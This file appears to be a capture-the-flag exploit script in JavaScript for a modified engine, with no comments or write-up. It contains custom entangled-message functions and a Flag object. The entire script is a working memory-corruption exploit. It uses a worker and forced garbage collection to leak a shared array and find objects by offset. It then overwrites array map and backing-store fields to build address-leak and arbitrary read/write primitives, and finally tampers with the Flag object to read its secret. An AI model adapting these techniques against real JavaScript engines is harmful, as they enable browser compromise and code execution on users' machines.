
function gcMajor() {
  new ArrayBuffer(1);
  new ArrayBuffer(1);
  new ArrayBuffer(2 ** 24);
}

function gcMinor() {
  try {
    for (let i = 0; i < 0x4; i++) {
      let a = new Array(0x10000);
    }
  } catch(e) {}
}

function w() {
  let cvtbuf = new ArrayBuffer(8);
  let ibuf = new BigUint64Array(cvtbuf);
  let fbuf = new Float64Array(cvtbuf);

  function itof(i) {
    ibuf[0] = i;
    return fbuf[0];
  }

  function ftoi(f) {
    fbuf[0] = f;
    return ibuf[0];
  }
  function getBigIntSlot(i, slot) {
    return (-i >> BigInt(slot * 64)) & 0xffffffffffffffffn;
  }

  let stolen;

  this.onmessage = function(e) {
    if (e.data == 1) {
      stolen = this.getMessageEntangle();
      //
      //
    } else if (e.data == 2) {
      for (let i = 80; i < 870; i++) {
        let l = getBigIntSlot(stolen, i);
        if (l != 0x53d0000053dn) {
          print("found: " + i);
          let array_idx = getBigIntSlot(stolen, i + 7);
          let array_map = getBigIntSlot(stolen, i + 14);
          let array_bs = getBigIntSlot(stolen, i + 15);
          if (array_idx < 0x1000) {
            array_idx = (array_idx >> 1n) - 0x100n;
          } else {
            array_idx = (array_idx >> 33n) - 0x100n;
          }
          print("posting message");
          postMessage({msg: 1, idx: array_idx, offset: i, array_map: array_map, array_bs: array_bs});
          break;
        }
      }
    } else if (e.data == 3) {
      for (let i = 0; i < 0x700; i++) {
        if (ftoi(stolen[i]) == 0x20400000000n) {
          stolen[i] = itof(0xf7fffffff7ffffffn);
          stolen[i + 1] = itof(0xf7fffffff7ffffffn);
          stolen[i + 2] = itof(0n);
          stolen[i + 9] = stolen[i + 20];
          postMessage({msg: 2});

        }
      }
    }
  }
}

function main() {
  let cvtbuf = new ArrayBuffer(8);
  let ibuf = new BigUint64Array(cvtbuf);
  let fbuf = new Float64Array(cvtbuf);

  function itof(i) {
    ibuf[0] = i;
    return fbuf[0];
  }

  function ftoi(f) {
    fbuf[0] = f;
    return ibuf[0];
  }

  let worker = new Worker(w, {type: "function"});

  let m = new Array(0x1000).fill(1.1);

  worker.postMessageEntangle(m);
  worker.postMessage(1);

  gcMinor();
  gcMinor();

  let keep = new Array(0x10);
  for (let i = 0; i < 0x10; i++) {
    let a = new Array(0x300).fill(itof(0x0000053d0000053dn));

    let x = {};
    let ab = new ArrayBuffer((0x100 + i) << 4);
    let f = [1.1,1.2,1.3];
    let o = [{},{}];
    keep[i] = [a,ab,f,o];

  }

  let idx;
  worker.onmessage = function(e) {
    if (e.data.msg == 1) {

    console.log(e.data.msg);
    idx = e.data.idx;
    let offset = e.data.offset;

    let target = keep[idx][0];
   
    target[0x300 - offset - 1] = itof((e.data.array_map ));
    target[0x300 - offset - 0] = itof((e.data.array_bs + 0x1000000000000n - 0x1000n));
    worker.postMessage(3);
    } else if (e.data.msg == 2) {
      let ab = keep[idx][1];
      let fa = keep[idx][2];
      let oa = keep[idx][3];

      let dv = new DataView(ab);

      function getAddressOf(o) {
        oa[0] = o;
        return Number(ftoi(fa[0]) & 0xffffffffn) - 1;
      }
      let test = {a : {}};
      let f = new Flag();
      let addr = getAddressOf(f);
      dv.setUint32((addr) + 0x10, 0x1337 << 1, true);
      f.initialize();
      let string = dv.getUint32((addr) + 0x18, true);
      let test_addr = getAddressOf(test);
      dv.setUint32(test_addr + 0xc, string, true);
      print(test.a);
    }
  }

  worker.postMessage(2);
}

main();


